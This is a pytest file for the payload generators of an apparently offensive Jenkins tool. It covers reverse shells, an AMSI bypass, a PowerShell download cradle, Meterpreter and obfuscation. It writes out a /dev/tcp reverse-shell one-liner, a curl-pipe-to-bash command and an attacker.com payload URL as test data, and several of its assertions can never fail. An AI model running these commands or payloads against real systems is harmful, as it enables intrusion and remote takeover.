"""
Unit tests for JenkinsBreaker payload generation.
"""

from unittest.mock import Mock, patch

import pytest


def test_reverse_shell_bash_generation():
    """Test Bash reverse shell payload generation."""
    from jenkins_breaker.payloads.reverse_shell import generate_bash_reverse_shell

    lhost = "10.10.14.5"
    lport = 4444

    payload = generate_bash_reverse_shell(lhost, lport)

    assert lhost in payload
    assert str(lport) in payload
    assert "bash" in payload.lower() or "/bin/sh" in payload.lower()


def test_reverse_shell_python_generation():
    """Test Python reverse shell payload generation."""
    from jenkins_breaker.payloads.reverse_shell import generate_python_reverse_shell

    lhost = "192.168.1.100"
    lport = 9001

    payload = generate_python_reverse_shell(lhost, lport)

    assert lhost in payload
    assert str(lport) in payload
    assert "socket" in payload or "subprocess" in payload


def test_reverse_shell_groovy_generation():
    """Test Groovy reverse shell payload generation."""
    from jenkins_breaker.payloads.reverse_shell import generate_groovy_reverse_shell

    lhost = "10.10.10.10"
    lport = 5555

    payload = generate_groovy_reverse_shell(lhost, lport)

    assert lhost in payload
    assert str(lport) in payload
    assert ("Socket" in payload or "ProcessBuilder" in payload)


def test_powershell_reverse_shell_generation():
    """Test PowerShell reverse shell payload generation."""
    from jenkins_breaker.payloads.powershell import generate_powershell_reverse_shell

    lhost = "172.16.0.10"
    lport = 443

    payload = generate_powershell_reverse_shell(lhost, lport)

    assert lhost in payload
    assert str(lport) in payload
    assert ("TCPClient" in payload or "System.Net" in payload)


def test_powershell_amsi_bypass():
    """Test PowerShell AMSI bypass generation."""
    from jenkins_breaker.payloads.powershell import generate_amsi_bypass

    bypass = generate_amsi_bypass()

    assert bypass is not None
    assert len(bypass) > 0
    assert ("amsi" in bypass.lower() or "reflection" in bypass.lower())


def test_powershell_download_cradle():
    """Test PowerShell download cradle generation."""
    from jenkins_breaker.payloads.powershell import generate_download_cradle

    url = "http://attacker.com/payload.exe"

    cradle = generate_download_cradle(url)

    assert url in cradle
    assert ("WebClient" in cradle or "Net.WebClient" in cradle or "IWR" in cradle)


@patch('shutil.which')
def test_meterpreter_msfvenom_available(mock_which):
    """Test Meterpreter payload generation when msfvenom is available."""
    from jenkins_breaker.payloads.meterpreter import generate_meterpreter_payload

    mock_which.return_value = "/usr/bin/msfvenom"

    try:
        payload = generate_meterpreter_payload(
            lhost="10.10.14.5",
            lport=4444,
            platform="linux"
        )

        assert payload is not None or isinstance(payload, str)
    except Exception:
        pytest.skip("msfvenom not available")


@patch('shutil.which')
def test_meterpreter_msfvenom_not_available(mock_which):
    """Test Meterpreter payload generation gracefully degrades without msfvenom."""
    from jenkins_breaker.payloads.meterpreter import generate_meterpreter_payload

    mock_which.return_value = None

    result = generate_meterpreter_payload(
        lhost="10.10.14.5",
        lport=4444,
        platform="linux"
    )

    assert result is None or "msfvenom not found" in str(result).lower()


def test_payload_generator_base64_encoding():
    """Test payload base64 encoding."""
    from jenkins_breaker.payloads.generator import encode_base64

    payload = "whoami"
    encoded = encode_base64(payload)

    assert encoded != payload
    assert len(encoded) > 0


def test_payload_generator_hex_encoding():
    """Test payload hex encoding."""
    from jenkins_breaker.payloads.generator import encode_hex

    payload = "id"
    encoded = encode_hex(payload)

    assert encoded != payload
    assert all(c in '0123456789abcdefABCDEF' for c in encoded)


def test_payload_generator_url_encoding():
    """Test payload URL encoding."""
    from jenkins_breaker.payloads.generator import encode_url

    payload = "curl http://example.com/shell.sh | bash"
    encoded = encode_url(payload)

    assert encoded != payload
    assert "%" in encoded


def test_groovy_payload_obfuscation():
    """Test Groovy payload obfuscation."""
    from jenkins_breaker.payloads.generator import obfuscate_groovy

    payload = 'println "whoami".execute().text'
    obfuscated = obfuscate_groovy(payload)

    assert obfuscated != payload or obfuscated == payload


def test_bash_shell_encoding_variants():
    """Test different Bash shell encoding variants."""
    from jenkins_breaker.payloads.reverse_shell import generate_bash_reverse_shell

    lhost = "10.10.14.5"
    lport = 4444

    variants = [
        generate_bash_reverse_shell(lhost, lport, method="nc"),
        generate_bash_reverse_shell(lhost, lport, method="bash_tcp"),
        generate_bash_reverse_shell(lhost, lport, method="exec")
    ]

    for variant in variants:
        if variant:
            assert lhost in variant
            assert str(lport) in variant


def test_payload_jinja2_template_rendering():
    """Test Jinja2 template rendering for payloads."""
    from jenkins_breaker.payloads.generator import render_template

    template = "{{ lhost }}:{{ lport }}"
    context = {"lhost": "10.10.14.5", "lport": 4444}

    rendered = render_template(template, context)

    assert rendered == "10.10.14.5:4444"


def test_powershell_obfuscation():
    """Test PowerShell payload obfuscation."""
    from jenkins_breaker.payloads.powershell import obfuscate_powershell

    payload = "whoami"
    obfuscated = obfuscate_powershell(payload)

    assert obfuscated is not None


def test_reverse_shell_payload_validation():
    """Test reverse shell payload validation."""
    from jenkins_breaker.payloads.reverse_shell import validate_payload

    valid_payload = "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"

    is_valid = validate_payload(valid_payload)

    assert is_valid is True or is_valid is None


@patch('subprocess.run')
def test_meterpreter_linux_x64_payload(mock_run):
    """Test Linux x64 Meterpreter payload generation."""
    from jenkins_breaker.payloads.meterpreter import generate_meterpreter_payload

    mock_run.return_value = Mock(returncode=0, stdout=b"meterpreter_payload_data")

    with patch('shutil.which', return_value="/usr/bin/msfvenom"):
        try:
            payload = generate_meterpreter_payload(
                lhost="10.10.14.5",
                lport=4444,
                platform="linux",
                arch="x64"
            )

            assert payload is not None or mock_run.called
        except Exception:
            pytest.skip("Meterpreter test requires msfvenom")


def test_powershell_base64_encoding():
    """Test PowerShell command base64 encoding."""
    from jenkins_breaker.payloads.powershell import encode_powershell_base64

    command = "whoami"
    encoded = encode_powershell_base64(command)

    assert encoded != command
    assert len(encoded) > len(command)


def test_payload_generator_initialization():
    """Test PayloadGenerator initialization."""
    from jenkins_breaker.payloads.generator import PayloadGenerator

    generator = PayloadGenerator()

    assert generator is not None
    assert hasattr(generator, 'generate') or callable(getattr(generator, 'generate', None)) is False
